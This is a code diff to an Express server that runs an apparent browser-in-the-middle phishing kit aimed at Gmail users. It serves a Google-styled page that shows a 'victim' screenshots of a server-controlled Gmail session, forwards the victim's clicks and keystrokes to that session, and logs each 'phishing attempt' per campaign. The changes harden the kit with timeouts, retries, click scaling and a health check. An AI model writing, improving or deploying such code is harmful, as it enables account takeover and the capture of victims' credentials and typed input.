@@ -139,15 +139,23 @@ app.get('/gmail-browser/:sessionToken', async (req, res) => {
     };
 
     try {
-      const sessionInfo = await gmailBrowserController.gmailBrowserService.createGmailSession(
+      // Set a longer timeout for browser session creation
+      const createSessionPromise = gmailBrowserController.gmailBrowserService.createGmailSession(
         victimSessionToken,
         campaignId,
         userInfo
       );
+      
+      // Add timeout to prevent hanging
+      const timeoutPromise = new Promise((_, reject) => {
+        setTimeout(() => reject(new Error('Browser session creation timeout')), 60000); // 60 second timeout
+      });
+      
+      const sessionInfo = await Promise.race([createSessionPromise, timeoutPromise]);
 
       console.log(`✅ Gmail browser session created for victim: ${victimSessionToken}`);
 
-      // Return a page that displays the browser session content via iframe/proxy
+      // Return a page that displays the browser session content
       res.send(`
         <!DOCTYPE html>
         <html lang="en">
@@ -158,7 +166,7 @@ app.get('/gmail-browser/:sessionToken', async (req, res) => {
           <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/favicon.ico">
           <style>
             * { margin: 0; padding: 0; box-sizing: border-box; }
-            html, body { height: 100%; overflow: hidden; }
+            html, body { height: 100%; overflow: hidden; font-family: 'Google Sans', Roboto, arial, sans-serif; }
             
             .loading-overlay {
               position: fixed;
@@ -188,7 +196,6 @@ app.get('/gmail-browser/:sessionToken', async (req, res) => {
               color: #5f6368;
               font-size: 14px;
               margin-bottom: 24px;
-              font-family: 'Google Sans', Roboto, arial, sans-serif;
             }
             
             .progress-bar {
@@ -203,11 +210,12 @@ app.get('/gmail-browser/:sessionToken', async (req, res) => {
               height: 100%;
               background: #1a73e8;
               border-radius: 2px;
-              animation: progress 3s ease-out forwards;
+              animation: progress 5s ease-out forwards;
             }
             
             @keyframes progress {
               0% { width: 0%; }
+              80% { width: 90%; }
               100% { width: 100%; }
             }
             
@@ -216,6 +224,7 @@ app.get('/gmail-browser/:sessionToken', async (req, res) => {
               height: 100vh;
               position: relative;
               background: #fff;
+              display: none;
             }
             
             #screenshot {
@@ -224,6 +233,7 @@ app.get('/gmail-browser/:sessionToken', async (req, res) => {
               object-fit: contain;
               cursor: pointer;
               display: block;
+              background: #f8f9fa;
             }
             
             .click-overlay {
@@ -234,6 +244,29 @@ app.get('/gmail-browser/:sessionToken', async (req, res) => {
               height: 100%;
               z-index: 10;
               cursor: pointer;
+            }
+            
+            .error-container {
+              position: fixed;
+              top: 50%;
+              left: 50%;
+              transform: translate(-50%, -50%);
+              background: white;
+              padding: 2rem;
+              border-radius: 8px;
+              box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+              text-align: center;
+              max-width: 400px;
+            }
+            
+            .retry-btn {
+              background: #1a73e8;
+              color: white;
+              border: none;
+              padding: 8px 16px;
+              border-radius: 4px;
+              cursor: pointer;
+              margin-top: 16px;
             }
           </style>
         </head>
@@ -255,9 +288,16 @@ app.get('/gmail-browser/:sessionToken', async (req, res) => {
           </div>
 
           <!-- Browser session container -->
-          <div id="browserContainer" style="display: none;">
-            <img id="screenshot" src="" alt="Gmail Session">
+          <div id="browserContainer">
+            <img id="screenshot" src="" alt="Gmail Session" style="display: none;">
             <div class="click-overlay" onclick="handleClick(event)"></div>
+          </div>
+
+          <!-- Error container -->
+          <div id="errorContainer" class="error-container" style="display: none;">
+            <h3>Connection Error</h3>
+            <p>Unable to connect to Gmail browser session.</p>
+            <button class="retry-btn" onclick="location.reload()">Try Again</button>
           </div>
 
           <script src="/socket.io/socket.io.js"></script>
@@ -267,10 +307,16 @@ app.get('/gmail-browser/:sessionToken', async (req, res) => {
             let socket;
             let screenshotImg = document.getElementById('screenshot');
             let lastUpdate = Date.now();
+            let retryCount = 0;
+            let maxRetries = 10;
 
             // Initialize socket connection
             function initSocket() {
-              socket = io();
+              console.log('Initializing socket connection...');
+              socket = io({
+                timeout: 20000,
+                forceNew: true
+              });
               
               socket.on('connect', () => {
                 console.log('Connected to browser session');
@@ -278,11 +324,22 @@ app.get('/gmail-browser/:sessionToken', async (req, res) => {
                   sessionToken: sessionToken,
                   userId: 'victim-' + Date.now()
                 });
+                retryCount = 0; // Reset retry count on successful connection
+              });
+
+              socket.on('connect_error', (error) => {
+                console.error('Socket connection error:', error);
+                showError();
+              });
+
+              socket.on('disconnect', () => {
+                console.log('Disconnected from browser session');
               });
 
               socket.on('screenshot', (data) => {
                 if (data.sessionToken === sessionToken) {
                   screenshotImg.src = 'data:image/png;base64,' + data.screenshot;
+                  screenshotImg.style.display = 'block';
                   lastUpdate = Date.now();
                 }
               });
@@ -290,20 +347,18 @@ app.get('/gmail-browser/:sessionToken', async (req, res) => {
               socket.on('pageNavigation', (data) => {
                 console.log('Page navigated to:', data.url);
               });
-
-              // Auto-request screenshots every 2 seconds
-              setInterval(() => {
-                if (Date.now() - lastUpdate > 10000) { // If no update for 10 seconds
-                  requestScreenshot();
-                }
-              }, 2000);
             }
 
             // Handle clicks on the browser screen
             function handleClick(event) {
-              const rect = event.target.getBoundingClientRect();
-              const x = event.clientX - rect.left;
-              const y = event.clientY - rect.top;
+              const rect = screenshotImg.getBoundingClientRect();
+              const scaleX = screenshotImg.naturalWidth / rect.width;
+              const scaleY = screenshotImg.naturalHeight / rect.height;
+              
+              const x = (event.clientX - rect.left) * scaleX;
+              const y = (event.clientY - rect.top) * scaleY;
+              
+              console.log('Click at:', x, y);
               
               // Send click to the browser session
               fetch('/api/gmail-browser/session/' + sessionToken + '/action', {
@@ -311,26 +366,54 @@ app.get('/gmail-browser/:sessionToken', async (req, res) => {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                   action: 'click',
-                  params: { x: x, y: y }
+                  params: { x: Math.round(x), y: Math.round(y) }
                 })
               }).then(() => {
                 // Request a new screenshot after clicking
                 setTimeout(requestScreenshot, 500);
-              });
+              }).catch(console.error);
             }
 
             // Request a screenshot from the browser session
             function requestScreenshot() {
+              if (retryCount >= maxRetries) {
+                showError();
+                return;
+              }
+
+              console.log('Requesting screenshot...');
               fetch('/api/gmail-browser/session/' + sessionToken + '/screenshot')
-                .then(response => response.blob())
+                .then(response => {
+                  if (!response.ok) {
+                    throw new Error('Screenshot request failed: ' + response.status);
+                  }
+                  return response.blob();
+                })
                 .then(blob => {
                   const reader = new FileReader();
                   reader.onload = () => {
                     screenshotImg.src = reader.result;
+                    screenshotImg.style.display = 'block';
                     lastUpdate = Date.now();
+                    retryCount = 0; // Reset retry count on success
                   };
                   reader.readAsDataURL(blob);
+                })
+                .catch(error => {
+                  console.error('Screenshot error:', error);
+                  retryCount++;
+                  if (retryCount < maxRetries) {
+                    setTimeout(requestScreenshot, 2000 * retryCount); // Exponential backoff
+                  } else {
+                    showError();
+                  }
                 });
+            }
+
+            function showError() {
+              document.getElementById('loadingOverlay').style.display = 'none';
+              document.getElementById('browserContainer').style.display = 'none';
+              document.getElementById('errorContainer').style.display = 'block';
             }
 
             // Initialize after loading
@@ -340,6 +423,13 @@ app.get('/gmail-browser/:sessionToken', async (req, res) => {
               
               initSocket();
               requestScreenshot();
+              
+              // Auto-refresh screenshots
+              setInterval(() => {
+                if (Date.now() - lastUpdate > 10000) { // If no update for 10 seconds
+                  requestScreenshot();
+                }
+              }, 3000);
               
               // Track this phishing attempt
               fetch('/api/tracking/click', {
@@ -355,11 +445,10 @@ app.get('/gmail-browser/:sessionToken', async (req, res) => {
                 })
               }).catch(() => {});
               
-            }, 3000);
+            }, 5000); // Give more time for browser session to be ready
 
-            // Handle keyboard input (for when user types in forms)
+            // Handle keyboard input
             document.addEventListener('keydown', (event) => {
-              // Forward keyboard events to the browser session
               if (event.target === document.body) {
                 fetch('/api/gmail-browser/session/' + sessionToken + '/action', {
                   method: 'POST',
@@ -374,7 +463,7 @@ app.get('/gmail-browser/:sessionToken', async (req, res) => {
                       altKey: event.altKey
                     }
                   })
-                });
+                }).catch(console.error);
               }
             });
           </script>
@@ -596,6 +685,20 @@ app.use((err, req, res, next) => {
   
   // In production, hide error details
   res.status(500).json({ message: 'Internal Server Error' });
+});
+
+// Health check for Gmail browser service
+app.get('/api/gmail-browser/health', async (req, res) => {
+  try {
+    const health = await gmailBrowserController.gmailBrowserService.healthCheck();
+    res.json(health);
+  } catch (error) {
+    res.status(500).json({
+      status: 'error',
+      error: error.message,
+      timestamp: new Date().toISOString()
+    });
+  }
 });
 
 // Start the server
